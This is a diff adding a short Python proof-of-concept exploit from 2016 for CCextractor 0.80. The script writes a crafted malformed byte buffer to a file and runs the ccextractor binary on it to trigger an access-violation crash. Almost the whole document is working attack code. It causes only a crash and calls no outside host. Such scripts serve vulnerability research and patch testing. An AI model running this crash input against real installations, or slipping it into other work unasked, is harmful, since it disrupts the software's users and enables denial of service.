@@ -1,0 +1,43 @@
+# Exploit Title: CCextractor 0.80 Access Violation Crash
+# Date: 31st May 2016
+# Exploit Author: David Silveiro (Xino.co.uk)
+# Vendor Homepage: http://www.ccextractor.org/
+# Software Link: http://www.ccextractor.org/download-ccextractor.html
+# Version: 0.80
+# Tested on: Ubuntu 14 LTS
+# CVE : 0 day
+
+from subprocess import call
+from shlex import split
+from time import sleep
+
+
+def crash():
+
+    command = './ccextractor crash'
+
+    buffer = '\x00\x00\x00\x04ssixssixs'
+
+    with open('crash', 'w+b') as file:
+        file.write(buffer)
+
+    try:
+        call(split(command))
+        print("Exploit successful!             ")
+
+    except:
+        print("Error: Something has gone wrong!")
+
+
+def main():
+
+    print("Author:   David Silveiro                         ")
+    print("   CCextractor 0.80 Access Violation Crash       ")
+
+    sleep(2) 
+
+    crash()
+ 
+
+if __name__ == "__main__":
+    main()
